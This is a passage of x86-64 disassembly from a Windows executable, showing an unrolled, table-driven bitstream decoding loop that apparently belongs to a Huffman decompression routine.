   14000344d:	49 c1 e1 30          	shl    $0x30,%r9
   140003451:	4c 01 cb             	add    %r9,%rbx
   140003454:	45 0f b6 48 0b       	movzbl 0xb(%r8),%r9d
   140003459:	49 c1 e1 28          	shl    $0x28,%r9
   14000345d:	4c 01 cb             	add    %r9,%rbx
   140003460:	45 0f b6 48 0a       	movzbl 0xa(%r8),%r9d
   140003465:	49 c1 e1 20          	shl    $0x20,%r9
   140003469:	4c 01 cb             	add    %r9,%rbx
   14000346c:	45 0f b6 48 09       	movzbl 0x9(%r8),%r9d
   140003471:	49 c1 e1 18          	shl    $0x18,%r9
   140003475:	4c 01 cb             	add    %r9,%rbx
   140003478:	45 0f b6 48 08       	movzbl 0x8(%r8),%r9d
   14000347d:	49 c1 e1 10          	shl    $0x10,%r9
   140003481:	4c 01 cb             	add    %r9,%rbx
   140003484:	45 0f b6 48 07       	movzbl 0x7(%r8),%r9d
   140003489:	49 c1 e1 08          	shl    $0x8,%r9
   14000348d:	4c 01 cb             	add    %r9,%rbx
   140003490:	84 c0                	test   %al,%al
   140003492:	0f 84 9d fa ff ff    	je     0x140002f35
   140003498:	44 0f bd c8          	bsr    %eax,%r9d
   14000349c:	b8 09 00 00 00       	mov    $0x9,%eax
   1400034a1:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400034a6:	44 29 e8             	sub    %r13d,%eax
   1400034a9:	c1 e0 03             	shl    $0x3,%eax
   1400034ac:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400034b1:	44 29 c8             	sub    %r9d,%eax
   1400034b4:	e9 e2 fa ff ff       	jmp    0x140002f9b
   1400034b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400034c0:	48 c7 c2 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rdx
   1400034c7:	e9 70 fa ff ff       	jmp    0x140002f3c
   1400034cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400034d0:	45 0f b6 27          	movzbl (%r15),%r12d
   1400034d4:	66 83 fd 07          	cmp    $0x7,%bp
   1400034d8:	77 7c                	ja     0x140003556
   1400034da:	4c 8d 35 5f ec 01 00 	lea    0x1ec5f(%rip),%r14        # 0x140022140
   1400034e1:	4d 63 2c be          	movslq (%r14,%rdi,4),%r13
   1400034e5:	4d 01 f5             	add    %r14,%r13
   1400034e8:	41 ff e5             	jmp    *%r13
   1400034eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034f0:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   1400034f5:	45 0f b6 6f 06       	movzbl 0x6(%r15),%r13d
   1400034fa:	49 c1 e5 30          	shl    $0x30,%r13
   1400034fe:	4d 01 ec             	add    %r13,%r12
   140003501:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140003506:	45 0f b6 6f 05       	movzbl 0x5(%r15),%r13d
   14000350b:	49 c1 e5 28          	shl    $0x28,%r13
   14000350f:	4d 01 ec             	add    %r13,%r12
   140003512:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140003517:	45 0f b6 6f 04       	movzbl 0x4(%r15),%r13d
   14000351c:	49 c1 e5 20          	shl    $0x20,%r13
   140003520:	4d 01 ec             	add    %r13,%r12
   140003523:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140003528:	45 0f b6 6f 03       	movzbl 0x3(%r15),%r13d
   14000352d:	49 c1 e5 18          	shl    $0x18,%r13
   140003531:	4d 01 ec             	add    %r13,%r12
   140003534:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140003539:	45 0f b6 6e 02       	movzbl 0x2(%r14),%r13d
   14000353e:	49 c1 e5 10          	shl    $0x10,%r13
   140003542:	4d 01 ec             	add    %r13,%r12
   140003545:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   14000354a:	45 0f b6 6e 01       	movzbl 0x1(%r14),%r13d
   14000354f:	49 c1 e5 08          	shl    $0x8,%r13
   140003553:	4d 01 ec             	add    %r13,%r12
   140003556:	45 84 c9             	test   %r9b,%r9b
   140003559:	0f 84 d6 f9 ff ff    	je     0x140002f35
   14000355f:	45 0f bd e9          	bsr    %r9d,%r13d
   140003563:	41 b9 09 00 00 00    	mov    $0x9,%r9d
   140003569:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   14000356e:	41 29 e9             	sub    %ebp,%r9d
   140003571:	41 c1 e1 03          	shl    $0x3,%r9d
   140003575:	4c 89 7c 24 08       	mov    %r15,0x8(%rsp)
   14000357a:	45 29 e9             	sub    %r13d,%r9d
   14000357d:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   140003582:	e9 62 fa ff ff       	jmp    0x140002fe9
   140003587:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000358e:	00 00 
   140003590:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140003597:	e9 a0 f9 ff ff       	jmp    0x140002f3c
   14000359c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400035a0:	45 0f b6 37          	movzbl (%r15),%r14d
   1400035a4:	66 41 83 fa 07       	cmp    $0x7,%r10w
   1400035a9:	77 59                	ja     0x140003604
   1400035ab:	4c 8d 2d ae eb 01 00 	lea    0x1ebae(%rip),%r13        # 0x140022160
   1400035b2:	4b 63 6c 9d 00       	movslq 0x0(%r13,%r11,4),%rbp
   1400035b7:	4c 01 ed             	add    %r13,%rbp
   1400035ba:	ff e5                	jmp    *%rbp
   1400035bc:	41 0f b6 6f 06       	movzbl 0x6(%r15),%ebp
   1400035c1:	48 c1 e5 30          	shl    $0x30,%rbp
   1400035c5:	49 01 ee             	add    %rbp,%r14
   1400035c8:	41 0f b6 6f 05       	movzbl 0x5(%r15),%ebp
   1400035cd:	48 c1 e5 28          	shl    $0x28,%rbp
   1400035d1:	49 01 ee             	add    %rbp,%r14
   1400035d4:	41 0f b6 6f 04       	movzbl 0x4(%r15),%ebp
   1400035d9:	48 c1 e5 20          	shl    $0x20,%rbp
   1400035dd:	49 01 ee             	add    %rbp,%r14
   1400035e0:	41 0f b6 6f 03       	movzbl 0x3(%r15),%ebp
   1400035e5:	48 c1 e5 18          	shl    $0x18,%rbp
   1400035e9:	49 01 ee             	add    %rbp,%r14
   1400035ec:	41 0f b6 6f 02       	movzbl 0x2(%r15),%ebp
   1400035f1:	48 c1 e5 10          	shl    $0x10,%rbp
   1400035f5:	49 01 ee             	add    %rbp,%r14
   1400035f8:	41 0f b6 6f 01       	movzbl 0x1(%r15),%ebp
   1400035fd:	48 c1 e5 08          	shl    $0x8,%rbp
   140003601:	49 01 ee             	add    %rbp,%r14
   140003604:	40 84 ff             	test   %dil,%dil
   140003607:	0f 84 28 f9 ff ff    	je     0x140002f35
   14000360d:	45 0f b7 ea          	movzwl %r10w,%r13d
   140003611:	bd 09 00 00 00       	mov    $0x9,%ebp
   140003616:	0f bd ff             	bsr    %edi,%edi
   140003619:	4c 89 7c 24 10       	mov    %r15,0x10(%rsp)
   14000361e:	44 29 ed             	sub    %r13d,%ebp
   140003621:	44 8d 14 ed 00 00 00 	lea    0x0(,%rbp,8),%r10d
   140003628:	00 
   140003629:	41 29 fa             	sub    %edi,%r10d
   14000362c:	e9 fc f9 ff ff       	jmp    0x14000302d
   140003631:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003638:	48 39 4c 24 70       	cmp    %rcx,0x70(%rsp)
   14000363d:	4d 89 fc             	mov    %r15,%r12
   140003640:	4c 8b 34 24          	mov    (%rsp),%r14
   140003644:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   140003649:	41 0f 92 c5          	setb   %r13b
   14000364d:	48 39 bc 24 80 00 00 	cmp    %rdi,0x80(%rsp)
   140003654:	00 
   140003655:	4c 8b bc 24 98 00 00 	mov    0x98(%rsp),%r15
   14000365c:	00 
   14000365d:	41 0f 92 c0          	setb   %r8b
   140003661:	45 08 e8             	or     %r13b,%r8b
   140003664:	0f 85 cb f8 ff ff    	jne    0x140002f35
   14000366a:	48 39 ac 24 88 00 00 	cmp    %rbp,0x88(%rsp)
   140003671:	00 
   140003672:	0f 82 bd f8 ff ff    	jb     0x140002f35
   140003678:	83 f8 40             	cmp    $0x40,%eax
   14000367b:	0f 87 38 01 00 00    	ja     0x1400037b9
   140003681:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   140003686:	44 8b 6c 24 6c       	mov    0x6c(%rsp),%r13d
   14000368b:	44 89 14 24          	mov    %r10d,(%rsp)
   14000368f:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   140003694:	49 83 e8 03          	sub    $0x3,%r8
   140003698:	41 f7 dd             	neg    %r13d
   14000369b:	4c 89 84 24 98 00 00 	mov    %r8,0x98(%rsp)
   1400036a2:	00 
   1400036a3:	41 83 e5 3f          	and    $0x3f,%r13d
   1400036a7:	e9 cd 00 00 00       	jmp    0x140003779
   1400036ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400036b0:	4c 39 54 24 30       	cmp    %r10,0x30(%rsp)
   1400036b5:	0f 84 f5 00 00 00    	je     0x1400037b0
   1400036bb:	89 c3                	mov    %eax,%ebx
   1400036bd:	4d 89 d0             	mov    %r10,%r8
   1400036c0:	c1 eb 03             	shr    $0x3,%ebx
   1400036c3:	41 89 d9             	mov    %ebx,%r9d
   1400036c6:	4d 29 c8             	sub    %r9,%r8
   1400036c9:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   1400036ce:	4d 39 c8             	cmp    %r9,%r8
   1400036d1:	0f 82 b9 06 00 00    	jb     0x140003d90
   1400036d7:	4c 8b 94 24 98 00 00 	mov    0x98(%rsp),%r10
   1400036de:	00 
   1400036df:	4c 39 d1             	cmp    %r10,%rcx
   1400036e2:	4d 89 c2             	mov    %r8,%r10
   1400036e5:	41 0f 92 c1          	setb   %r9b
   1400036e9:	c1 e3 03             	shl    $0x3,%ebx
   1400036ec:	29 d8                	sub    %ebx,%eax
   1400036ee:	49 8b 18             	mov    (%r8),%rbx
   1400036f1:	45 84 c9             	test   %r9b,%r9b
   1400036f4:	0f 84 b6 00 00 00    	je     0x1400037b0
   1400036fa:	c4 62 f9 f7 c3       	shlx   %rax,%rbx,%r8
   1400036ff:	c4 42 93 f7 c0       	shrx   %r13,%r8,%r8
   140003704:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003708:	48 83 c1 04          	add    $0x4,%rcx
   14000370c:	45 0f b6 08          	movzbl (%r8),%r9d
   140003710:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140003715:	41 01 c0             	add    %eax,%r8d
   140003718:	44 88 49 fc          	mov    %r9b,-0x4(%rcx)
   14000371c:	c4 e2 b9 f7 c3       	shlx   %r8,%rbx,%rax
   140003721:	c4 e2 93 f7 c0       	shrx   %r13,%rax,%rax
   140003726:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   14000372a:	44 0f b6 08          	movzbl (%rax),%r9d
   14000372e:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140003732:	44 01 c0             	add    %r8d,%eax
   140003735:	44 88 49 fd          	mov    %r9b,-0x3(%rcx)
   140003739:	c4 62 f9 f7 c3       	shlx   %rax,%rbx,%r8
   14000373e:	c4 42 93 f7 c0       	shrx   %r13,%r8,%r8
   140003743:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003747:	45 0f b6 08          	movzbl (%r8),%r9d
   14000374b:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140003750:	41 01 c0             	add    %eax,%r8d
   140003753:	44 88 49 fe          	mov    %r9b,-0x2(%rcx)
   140003757:	c4 e2 b9 f7 c3       	shlx   %r8,%rbx,%rax
   14000375c:	c4 e2 93 f7 c0       	shrx   %r13,%rax,%rax
   140003761:	48 8d 04 42          	lea    (%rdx,%rax,2),%rax
   140003765:	44 0f b6 08          	movzbl (%rax),%r9d
   140003769:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   14000376d:	44 01 c0             	add    %r8d,%eax
   140003770:	44 88 49 ff          	mov    %r9b,-0x1(%rcx)
   140003774:	83 f8 40             	cmp    $0x40,%eax
   140003777:	77 37                	ja     0x1400037b0
   140003779:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   14000377e:	4d 39 c2             	cmp    %r8,%r10
   140003781:	0f 82 29 ff ff ff    	jb     0x1400036b0
   140003787:	41 89 c0             	mov    %eax,%r8d
   14000378a:	83 e0 07             	and    $0x7,%eax
   14000378d:	41 c1 e8 03          	shr    $0x3,%r8d
   140003791:	4d 29 c2             	sub    %r8,%r10
   140003794:	4c 8b 84 24 98 00 00 	mov    0x98(%rsp),%r8
   14000379b:	00 
   14000379c:	49 8b 1a             	mov    (%r10),%rbx
   14000379f:	4c 39 c1             	cmp    %r8,%rcx
   1400037a2:	41 0f 92 c1          	setb   %r9b
   1400037a6:	e9 46 ff ff ff       	jmp    0x1400036f1
   1400037ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037b0:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400037b5:	44 8b 14 24          	mov    (%rsp),%r10d
   1400037b9:	44 8b 6c 24 6c       	mov    0x6c(%rsp),%r13d
   1400037be:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   1400037c3:	41 f7 dd             	neg    %r13d
   1400037c6:	41 83 e5 3f          	and    $0x3f,%r13d
   1400037ca:	4c 39 c1             	cmp    %r8,%rcx
   1400037cd:	73 29                	jae    0x1400037f8
   1400037cf:	c4 62 f9 f7 c3       	shlx   %rax,%rbx,%r8
   1400037d4:	c4 42 93 f7 c0       	shrx   %r13,%r8,%r8
   1400037d9:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   1400037dd:	48 83 c1 01          	add    $0x1,%rcx
   1400037e1:	45 0f b6 08          	movzbl (%r8),%r9d
   1400037e5:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   1400037ea:	44 88 49 ff          	mov    %r9b,-0x1(%rcx)
   1400037ee:	44 01 c0             	add    %r8d,%eax
   1400037f1:	48 39 4c 24 70       	cmp    %rcx,0x70(%rsp)
   1400037f6:	75 d7                	jne    0x1400037cf
   1400037f8:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   1400037fc:	83 f9 40             	cmp    $0x40,%ecx
   1400037ff:	0f 87 34 01 00 00    	ja     0x140003939
   140003805:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000380c:	00 
   14000380d:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
   140003812:	4c 8d 6b fd          	lea    -0x3(%rbx),%r13
   140003816:	8b 5c 24 6c          	mov    0x6c(%rsp),%ebx
   14000381a:	4c 89 2c 24          	mov    %r13,(%rsp)
   14000381e:	f7 db                	neg    %ebx
   140003820:	83 e3 3f             	and    $0x3f,%ebx
   140003823:	e9 d1 00 00 00       	jmp    0x1400038f9
   140003828:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000382f:	00 
   140003830:	4c 39 4c 24 28       	cmp    %r9,0x28(%rsp)
   140003835:	0f 84 f5 00 00 00    	je     0x140003930
   14000383b:	41 89 cc             	mov    %ecx,%r12d
   14000383e:	4d 89 c8             	mov    %r9,%r8
   140003841:	41 c1 ec 03          	shr    $0x3,%r12d
   140003845:	45 89 e5             	mov    %r12d,%r13d
   140003848:	4d 29 e8             	sub    %r13,%r8
   14000384b:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140003850:	4d 39 e8             	cmp    %r13,%r8
   140003853:	0f 82 67 05 00 00    	jb     0x140003dc0
   140003859:	4c 8b 0c 24          	mov    (%rsp),%r9
   14000385d:	4c 39 cf             	cmp    %r9,%rdi
   140003860:	4d 89 c1             	mov    %r8,%r9
   140003863:	41 0f 92 c5          	setb   %r13b
   140003867:	41 c1 e4 03          	shl    $0x3,%r12d
   14000386b:	44 29 e1             	sub    %r12d,%ecx
   14000386e:	4d 8b 20             	mov    (%r8),%r12
   140003871:	45 84 ed             	test   %r13b,%r13b
   140003874:	0f 84 b6 00 00 00    	je     0x140003930
   14000387a:	c4 42 f1 f7 c4       	shlx   %rcx,%r12,%r8
   14000387f:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   140003884:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003888:	48 83 c7 04          	add    $0x4,%rdi
   14000388c:	45 0f b6 28          	movzbl (%r8),%r13d
   140003890:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140003895:	41 01 c8             	add    %ecx,%r8d
   140003898:	44 88 6f fc          	mov    %r13b,-0x4(%rdi)
   14000389c:	c4 c2 b9 f7 cc       	shlx   %r8,%r12,%rcx
   1400038a1:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   1400038a6:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   1400038aa:	44 0f b6 29          	movzbl (%rcx),%r13d
   1400038ae:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   1400038b2:	44 01 c1             	add    %r8d,%ecx
   1400038b5:	44 88 6f fd          	mov    %r13b,-0x3(%rdi)
   1400038b9:	c4 42 f1 f7 c4       	shlx   %rcx,%r12,%r8
   1400038be:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   1400038c3:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   1400038c7:	45 0f b6 28          	movzbl (%r8),%r13d
   1400038cb:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   1400038d0:	41 01 c8             	add    %ecx,%r8d
   1400038d3:	44 88 6f fe          	mov    %r13b,-0x2(%rdi)
   1400038d7:	c4 c2 b9 f7 cc       	shlx   %r8,%r12,%rcx
   1400038dc:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   1400038e1:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   1400038e5:	44 0f b6 29          	movzbl (%rcx),%r13d
   1400038e9:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   1400038ed:	44 01 c1             	add    %r8d,%ecx
   1400038f0:	44 88 6f ff          	mov    %r13b,-0x1(%rdi)
   1400038f4:	83 f9 40             	cmp    $0x40,%ecx
   1400038f7:	77 37                	ja     0x140003930
   1400038f9:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   1400038fe:	4d 39 c1             	cmp    %r8,%r9
   140003901:	0f 82 29 ff ff ff    	jb     0x140003830
   140003907:	41 89 c8             	mov    %ecx,%r8d
   14000390a:	83 e1 07             	and    $0x7,%ecx
   14000390d:	41 c1 e8 03          	shr    $0x3,%r8d
   140003911:	4d 29 c1             	sub    %r8,%r9
   140003914:	4c 8b 04 24          	mov    (%rsp),%r8
   140003918:	4d 8b 21             	mov    (%r9),%r12
   14000391b:	4c 39 c7             	cmp    %r8,%rdi
   14000391e:	41 0f 92 c5          	setb   %r13b
   140003922:	e9 4a ff ff ff       	jmp    0x140003871
   140003927:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000392e:	00 00 
   140003930:	89 4c 24 68          	mov    %ecx,0x68(%rsp)
   140003934:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
   140003939:	44 8b 44 24 6c       	mov    0x6c(%rsp),%r8d
   14000393e:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003945:	00 
   140003946:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   14000394b:	41 f7 d8             	neg    %r8d
   14000394e:	41 83 e0 3f          	and    $0x3f,%r8d
   140003952:	48 39 df             	cmp    %rbx,%rdi
   140003955:	73 2b                	jae    0x140003982
   140003957:	c4 c2 b1 f7 cc       	shlx   %r9,%r12,%rcx
   14000395c:	c4 e2 bb f7 c9       	shrx   %r8,%rcx,%rcx
   140003961:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003965:	48 83 c7 01          	add    $0x1,%rdi
   140003969:	44 0f b6 29          	movzbl (%rcx),%r13d
   14000396d:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003971:	44 88 6f ff          	mov    %r13b,-0x1(%rdi)
   140003975:	41 01 c9             	add    %ecx,%r9d
   140003978:	48 39 fb             	cmp    %rdi,%rbx
   14000397b:	75 da                	jne    0x140003957
   14000397d:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   140003982:	41 83 fa 40          	cmp    $0x40,%r10d
   140003986:	0f 87 11 01 00 00    	ja     0x140003a9d
   14000398c:	8b 5c 24 6c          	mov    0x6c(%rsp),%ebx
   140003990:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
   140003997:	00 
   140003998:	4c 8b 4c 24 10       	mov    0x10(%rsp),%r9
   14000399d:	f7 db                	neg    %ebx
   14000399f:	4c 8d 67 fd          	lea    -0x3(%rdi),%r12
   1400039a3:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400039a8:	83 e3 3f             	and    $0x3f,%ebx
   1400039ab:	e9 bd 00 00 00       	jmp    0x140003a6d
   1400039b0:	4d 39 cf             	cmp    %r9,%r15
   1400039b3:	0f 84 df 00 00 00    	je     0x140003a98
   1400039b9:	44 89 d1             	mov    %r10d,%ecx
   1400039bc:	4d 89 c8             	mov    %r9,%r8
   1400039bf:	c1 e9 03             	shr    $0x3,%ecx
   1400039c2:	41 89 cd             	mov    %ecx,%r13d
   1400039c5:	4d 29 e8             	sub    %r13,%r8
   1400039c8:	4d 39 f8             	cmp    %r15,%r8
   1400039cb:	0f 82 1f 04 00 00    	jb     0x140003df0
   1400039d1:	4c 39 e5             	cmp    %r12,%rbp
   1400039d4:	4d 8b 30             	mov    (%r8),%r14
   1400039d7:	4d 89 c1             	mov    %r8,%r9
   1400039da:	41 0f 92 c5          	setb   %r13b
   1400039de:	c1 e1 03             	shl    $0x3,%ecx
   1400039e1:	41 29 ca             	sub    %ecx,%r10d
   1400039e4:	45 84 ed             	test   %r13b,%r13b
   1400039e7:	0f 84 ab 00 00 00    	je     0x140003a98
   1400039ed:	c4 c2 a9 f7 ce       	shlx   %r10,%r14,%rcx
   1400039f2:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   1400039f7:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   1400039fb:	48 83 c5 04          	add    $0x4,%rbp
   1400039ff:	44 0f b6 01          	movzbl (%rcx),%r8d
   140003a03:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003a07:	44 01 d1             	add    %r10d,%ecx
   140003a0a:	44 88 45 fc          	mov    %r8b,-0x4(%rbp)
   140003a0e:	c4 42 f1 f7 c6       	shlx   %rcx,%r14,%r8
   140003a13:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   140003a18:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003a1c:	45 0f b6 10          	movzbl (%r8),%r10d
   140003a20:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140003a25:	41 01 c8             	add    %ecx,%r8d
   140003a28:	44 88 55 fd          	mov    %r10b,-0x3(%rbp)
   140003a2c:	c4 c2 b9 f7 ce       	shlx   %r8,%r14,%rcx
   140003a31:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   140003a36:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003a3a:	44 0f b6 11          	movzbl (%rcx),%r10d
   140003a3e:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003a42:	44 01 c1             	add    %r8d,%ecx
   140003a45:	44 88 55 fe          	mov    %r10b,-0x2(%rbp)
   140003a49:	c4 42 f1 f7 c6       	shlx   %rcx,%r14,%r8
   140003a4e:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   140003a53:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003a57:	45 0f b6 50 01       	movzbl 0x1(%r8),%r10d
   140003a5c:	45 0f b6 28          	movzbl (%r8),%r13d
   140003a60:	41 01 ca             	add    %ecx,%r10d
   140003a63:	44 88 6d ff          	mov    %r13b,-0x1(%rbp)
   140003a67:	41 83 fa 40          	cmp    $0x40,%r10d
   140003a6b:	77 2b                	ja     0x140003a98
   140003a6d:	49 39 f9             	cmp    %rdi,%r9
   140003a70:	0f 82 3a ff ff ff    	jb     0x1400039b0
   140003a76:	44 89 d1             	mov    %r10d,%ecx
   140003a79:	41 83 e2 07          	and    $0x7,%r10d
   140003a7d:	c1 e9 03             	shr    $0x3,%ecx
   140003a80:	49 29 c9             	sub    %rcx,%r9
   140003a83:	4c 39 e5             	cmp    %r12,%rbp
   140003a86:	4d 8b 31             	mov    (%r9),%r14
   140003a89:	41 0f 92 c5          	setb   %r13b
   140003a8d:	e9 52 ff ff ff       	jmp    0x1400039e4
   140003a92:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003a98:	4c 89 4c 24 10       	mov    %r9,0x10(%rsp)
   140003a9d:	44 8b 44 24 6c       	mov    0x6c(%rsp),%r8d
   140003aa2:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
   140003aa9:	00 
   140003aaa:	41 f7 d8             	neg    %r8d
   140003aad:	48 89 fb             	mov    %rdi,%rbx
   140003ab0:	41 83 e0 3f          	and    $0x3f,%r8d
   140003ab4:	48 39 fd             	cmp    %rdi,%rbp
   140003ab7:	73 26                	jae    0x140003adf
   140003ab9:	c4 c2 a9 f7 ce       	shlx   %r10,%r14,%rcx
   140003abe:	c4 e2 bb f7 c9       	shrx   %r8,%rcx,%rcx
   140003ac3:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003ac7:	48 83 c5 01          	add    $0x1,%rbp
   140003acb:	44 0f b6 09          	movzbl (%rcx),%r9d
   140003acf:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003ad3:	44 88 4d ff          	mov    %r9b,-0x1(%rbp)
   140003ad7:	41 01 ca             	add    %ecx,%r10d
   140003ada:	48 39 eb             	cmp    %rbp,%rbx
   140003add:	75 da                	jne    0x140003ab9
   140003adf:	41 83 fb 40          	cmp    $0x40,%r11d
   140003ae3:	0f 87 19 01 00 00    	ja     0x140003c02
   140003ae9:	8b 5c 24 6c          	mov    0x6c(%rsp),%ebx
   140003aed:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140003af2:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   140003af7:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140003afc:	f7 db                	neg    %ebx
   140003afe:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140003b03:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140003b08:	83 e3 3f             	and    $0x3f,%ebx
   140003b0b:	e9 bd 00 00 00       	jmp    0x140003bcd
   140003b10:	48 39 fd             	cmp    %rdi,%rbp
   140003b13:	0f 84 df 00 00 00    	je     0x140003bf8
   140003b19:	44 89 d9             	mov    %r11d,%ecx
   140003b1c:	49 89 f8             	mov    %rdi,%r8
   140003b1f:	c1 e9 03             	shr    $0x3,%ecx
   140003b22:	41 89 c9             	mov    %ecx,%r9d
   140003b25:	4d 29 c8             	sub    %r9,%r8
   140003b28:	49 39 e8             	cmp    %rbp,%r8
   140003b2b:	0f 82 df 02 00 00    	jb     0x140003e10
   140003b31:	4c 39 ee             	cmp    %r13,%rsi
   140003b34:	4d 8b 08             	mov    (%r8),%r9
   140003b37:	4c 89 c7             	mov    %r8,%rdi
   140003b3a:	41 0f 92 c6          	setb   %r14b
   140003b3e:	c1 e1 03             	shl    $0x3,%ecx
   140003b41:	41 29 cb             	sub    %ecx,%r11d
   140003b44:	45 84 f6             	test   %r14b,%r14b
   140003b47:	0f 84 ab 00 00 00    	je     0x140003bf8
   140003b4d:	c4 c2 a1 f7 c9       	shlx   %r11,%r9,%rcx
   140003b52:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   140003b57:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003b5b:	48 83 c6 04          	add    $0x4,%rsi
   140003b5f:	44 0f b6 01          	movzbl (%rcx),%r8d
   140003b63:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003b67:	44 01 d9             	add    %r11d,%ecx
   140003b6a:	44 88 46 fc          	mov    %r8b,-0x4(%rsi)
   140003b6e:	c4 42 f1 f7 c1       	shlx   %rcx,%r9,%r8
   140003b73:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   140003b78:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003b7c:	45 0f b6 18          	movzbl (%r8),%r11d
   140003b80:	45 0f b6 40 01       	movzbl 0x1(%r8),%r8d
   140003b85:	41 01 c8             	add    %ecx,%r8d
   140003b88:	44 88 5e fd          	mov    %r11b,-0x3(%rsi)
   140003b8c:	c4 c2 b9 f7 c9       	shlx   %r8,%r9,%rcx
   140003b91:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   140003b96:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003b9a:	44 0f b6 19          	movzbl (%rcx),%r11d
   140003b9e:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003ba2:	44 01 c1             	add    %r8d,%ecx
   140003ba5:	44 88 5e fe          	mov    %r11b,-0x2(%rsi)
   140003ba9:	c4 42 f1 f7 c1       	shlx   %rcx,%r9,%r8
   140003bae:	c4 42 e3 f7 c0       	shrx   %rbx,%r8,%r8
   140003bb3:	4e 8d 04 42          	lea    (%rdx,%r8,2),%r8
   140003bb7:	45 0f b6 58 01       	movzbl 0x1(%r8),%r11d
   140003bbc:	45 0f b6 30          	movzbl (%r8),%r14d
